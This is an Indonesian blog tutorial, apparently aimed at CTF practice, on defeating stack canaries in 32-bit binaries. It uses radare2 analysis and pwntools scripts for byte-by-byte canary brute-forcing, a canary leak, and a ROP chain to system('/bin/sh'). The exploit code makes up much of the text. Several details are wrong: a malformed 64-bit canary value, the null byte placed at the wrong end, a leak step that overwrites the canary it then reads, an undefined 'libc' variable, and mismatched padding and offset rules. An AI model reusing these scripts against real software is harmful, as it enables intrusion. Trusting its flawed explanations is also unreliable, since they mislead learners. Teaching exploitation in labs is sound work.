---
title: Bypass Stack Canary - Pwn03
date: 2025-08-19
Tags: ["Pwn"]
---



## **1. Apa Itu Bit dan Byte?**  
Sebelum memahami **stack canary**, kita perlu mengerti dasar-dasar **bit** dan **byte**:  

- **1 Bit** = Nilai terkecil dalam komputasi (`0` atau `1`).  
- **1 Byte** = Kumpulan **8 bit** (contoh: `01011010`).  
  - **1 Byte bisa menyimpan nilai dari `0` sampai `255`** (total **256 kemungkinan**).  
  - Kenapa **256**? Karena `2^8 = 256` (8 bit = 256 kombinasi).  

Contoh:  
- `00000000` (binary) = `0` (decimal)  
- `11111111` (binary) = `255` (decimal)  

**Kesimpulan:**  
- **1 Byte = 8 Bit = Nilai 0-255 (total 256 kemungkinan).**  
- **Nilai 256 dipakai karena itu batas maksimal 1 byte.**  

---

## **2. Apa Itu Stack Canary?**  
**Stack Canary** adalah nilai rahasia (random) di stack yang berfungsi seperti "alarm" untuk mendeteksi **buffer overflow**.  

- **Ukuran Canary:**  
  - **32-bit program** → Canary = **4 byte** (contoh: `0xefbead00`)  
  - **64-bit program** → Canary = **8 byte** (contoh: `0xdeadbeefcafeb00`)  

- **Cara Kerja:**  
  - Jika ada **buffer overflow**, canary akan **tertimpa** sebelum return address.  
  - Sebelum fungsi selesai (`ret`), program mengecek apakah canary masih utuh.  
  - Jika **berubah** → Program crash (`*** stack smashing detected ***`).  

---

## **3. Kenapa Brute-Force Canary Menggunakan `range(256)`?**  
Karena **setiap byte canary bisa bernilai `0` sampai `255` (total 256 kemungkinan)**, kita perlu mencoba semua kemungkinan byte tersebut.  

### **Contoh Brute-Force Canary (32-bit)**
```python
from pwn import *

p = process("./binary32")  # Program 32-bit (canary 4 byte)

canary = b""  # Inisialisasi canary kosong

# Brute-force 3 byte pertama (byte ke-4 = \x00)
for i in range(3):  # 3 byte pertama
    for byte in range(256):  # Coba semua nilai byte (0-255)
        payload = b"A"*offset + canary + bytes([byte])
        p.sendline(payload)
        if b"stack smashing" not in p.recv():  # Jika tidak crash, byte benar
            canary += bytes([byte])  # Tambahkan byte yang benar
            print(f"Found byte {i+1}: {hex(byte)}")
            break

canary += b"\x00"  # Tambahkan null byte terakhir (byte ke-4)
print(f"Full canary: {hex(u32(canary))}")  # Output: 0xefbead00 (misal)
```

### **Penjelasan Kode:**  
1. **`for byte in range(256)`**  
   - Mencoba **semua nilai byte (0-255)** untuk menemukan byte yang benar.  
2. **`bytes([byte])`**  
   - Mengubah angka (misal `255`) menjadi byte (`\xff`).  
3. **`canary += b"\x00"`**  
   - Byte terakhir canary biasanya `\x00` (null byte), jadi tidak perlu ditebak.  

---

## **4. Penerapan Brute-Force Canary dalam Exploit**  
Setelah dapat **canary**, kita bisa lanjutkan eksploitasi dengan **Return-Oriented Programming (ROP)** atau **Ret2Libc**.  

### **Contoh Payload Setelah Dapat Canary (32-bit)**
```python
from pwn import *

p = process("./binary32")
offset = 64  # Ganti dengan offset yang benar
canary = b"\xef\xbe\xad\x00"  # Canary yang sudah ditemukan

# ROP chain untuk call system("/bin/sh")
rop = ROP("./binary32")
rop.call("system", [next(libc.search(b"/bin/sh"))])

payload = (
    b"A" * offset +  # Isi buffer
    canary +         # Canary yang benar
    b"B" * 12 +      # Padding (EBP & alignment)
    rop.chain()      # ROP chain
)

p.sendline(payload)
p.interactive()  # Dapat shell!
```

---

- **1 Byte = 8 Bit = Nilai 0-255 (256 kemungkinan).**  
- **Brute-force canary** = Mencoba semua kemungkinan byte (`0-255`) untuk menemukan nilai canary.  
- **32-bit canary** = 4 byte (3 byte ditebak, 1 byte null).  
- **64-bit canary** = 8 byte (7 byte ditebak, 1 byte null).  
- **Setelah dapat canary**, lanjutkan dengan **ROP/Ret2Libc** untuk bypass NX.  



# Beberapa fungsi yang vulnerability 

Canary biasanya terlibat ketika ada fungsi **tidak aman** yang membaca input user, seperti:  

| Fungsi       | Deskripsi Risiko                     |
|--------------|--------------------------------------|
| `gets`       | **Paling berbahaya**, tidak batasi input. |
| `scanf`      | Bisa overflow jika format `%s` tanpa batas. |
| `strcpy`     | Menyalin string tanpa cek panjang.   |
| `fgets`      | **Lebih aman**, tapi bisa tetap overflow jika ukuran buffer salah. |
| `read`       | Bisa overflow jika `read(fd, buf, size)` dengan `size` terlalu besar. |

### **Contoh Fungsi Vulnerable**
```c
// Contoh 1: gets() (paling mudah di-exploit)
void vuln() {
  char buf[80];
  gets(buf);  // Bisa overflow!
}

// Contoh 2: fgets() dengan ukuran salah
void vuln2() {
  char buf[80];
  fgets(buf, 200, stdin);  // Overflow karena size > kapasitas buf
}
```

---

## Menemukan Posisi Canary di Stack
selain menggunakan metode brute force, kita bisa menemukan canary
didalam stack, Kita akan menggunakan **radare2** untuk menganalisis binary.  


### **Buka Binary di r2**
```bash
r2 -d ./binary32   # Debug binary 32-bit
aaa                # Analisis semua simbol
afl                # Lihat daftar fungsi
s sym.vuln         # masuk ke vuln() example
```


Canary biasanya:
- Di-load dari `gs:0x14` (32-bit) atau `fs:0x28` (64-bit).
- Disimpan di stack (biasanya `[ebp - 0xc]` atau `[rbp - 0x8]`).

#### **Contoh Instruksi Canary di 32-bit**:
```asm
mov eax, gs:0x14      ; Load Canary dari GS segment
mov [ebp - 0xc], eax  ; Simpan Canary di stack
```

#### **Contoh Instruksi Canary di 64-bit**:
```asm
mov rax, qword [fs:0x28]  ; Load Canary dari FS segment
mov [rbp - 0x8], rax      ; Simpan Canary di stack
```


#### **1. Disassembly Fungsi Vulnerable di r2**
```asm
; Contoh fungsi vuln() di binary
sym.vuln:
  push ebp
  mov ebp, esp
  sub esp, 0x54       ; Alokasi 84 byte buffer
  mov eax, gs:0x14    ; Load canary
  mov [ebp-0xc], eax  ; Simpan canary di [ebp-0xc]
  lea eax, [ebp-0x50] ; Buffer dimulai di [ebp-0x50]
  push eax
  call gets           ; Overflow di sini
  ; ...
```

#### **2. Penjelasan Layout Stack**
```
| Alamat Stack | Isi                  |
|--------------|----------------------|
| ebp-0x54     | ? (padding)          |
| ebp-0x50     | BUFFER (mulai sini)  |  <-- Buffer overflow dimulai
| ...          | ...                  |
| ebp-0xc      | CANARY               |  <-- Target kita
| ebp-0x8      | Saved EBP            |
| ebp-0x4      | Return Address (EIP) |  <-- Goal akhir
```

#### **3. Hitung Offset ke Canary**
- **Buffer mulai** di `[ebp-0x50]` (80 byte dari `ebp`).
- **Canary** di `[ebp-0xc]` (12 byte dari `ebp`).
- **Jarak buffer ke canary** = `0x50 - 0xc = 0x44` (**68 byte**).

---

### **Praktek di radare2 (r2)**
#### **1. Buka Binary dan Analisis**
```bash
r2 -d ./binary32
aaa
s sym.vuln
pdf
```

#### **2. Output Contoh di r2**
```asm
┌ 150: sym.vuln ();
│           ; var int32_t var_50h @ ebp-0x50
│           ; var int32_t var_ch @ ebp-0xc
│           0x0804852d      push ebp
│           0x0804852e      mov ebp, esp
│           0x08048530      sub esp, 0x54
│           0x08048533      mov eax, gs:0x14
│           0x08048539      mov dword [var_ch], eax   ; [ebp-0xc] = canary
│           0x0804853c      lea eax, [var_50h]       ; [ebp-0x50] = buffer
│           0x0804853f      push eax
│           0x08048540      call sym.imp.gets        ; Overflow here
```

#### **3. Verifikasi dengan Breakpoint**
```bash
db sym.vuln     # Set breakpoint
dc              # Run program
px @ ebp-0x50   # Lihat buffer
px @ ebp-0xc    # Lihat canary
```

Output:
```
[0xffffd110]  00 00 00 00  00 00 00 00  # Buffer (ebp-0x50)
[0xffffd15c]  ef be ad de  00 00 00 00  # Canary (ebp-0xc) = 0xdeadbeef
```

---

### **Eksploitasi dengan Python**
```python
from pwn import *

p = process("./binary32")

# Langkah 1: Leak Canary
payload = b"A" * 68            # Isi buffer sampai canary (0x44 = 68)
p.sendline(payload + b"BBBB")  # Timpa canary
p.recvuntil(b"BBBB")
canary = u32(p.recv(4))        # Baca nilai canary
print(f"Canary: {hex(canary)}")

# Langkah 2: Timpa EIP
payload = (
    b"A" * 68 +                # Jarak buffer ke canary
    p32(canary) +              # Isi canary asli
    b"B" * 8 +                 # Jarak canary ke EIP (ebp-0xc ke ebp+0x4 = 16 byte)
    p32(0xdeadbeef)            # Return address
)
p.sendline(payload)
p.interactive()
```

---

### **FAQ Singkat**
1. **Q: Kenapa `0x50 - 0xc = 0x44`?**  
   **A**: Karena buffer mulai di `ebp-0x50`, canary di `ebp-0xc`.  
   Jarak = `0x50 - 0xc = 0x44` (68 byte).

2. **Q: Gimana kalau `sub esp, 0x60`?**  
   **A**: Hitung lagi buffer ke canary. Misal:  
   - Buffer di `[ebp-0x60]`, canary di `[ebp-0xc]` → offset = `0x60 - 0xc = 0x54` (84 byte).

3. **Q: Nilai `[ebp-0xc]` selalu tetap?**  
   **A**: Tidak selalu, tapi umumnya di `ebp-0xc` (32-bit) atau `rbp-0x8` (64-bit).  
   **Selalu cek di r2** dengan `px @ ebp-0xc`.

---

### **Kesimpulan**
- **Cari `sub esp, X`** → ukuran buffer = `X`.
- **Cari `[ebp-Y]`** → lokasi canary (biasanya `Y = 0xc`).
- **Offset** = `X - Y` (dalam hex, konversi ke desimal).

**Contoh Nyata**:
- `sub esp, 0x54` + canary di `[ebp-0xc]` → offset = `0x44` (68).
- `sub esp, 0x60` + canary di `[ebp-0xc]` → offset = `0x54` (84).

Gampangnya:  
**Offset = (Alamat buffer) - (Alamat canary)**.  
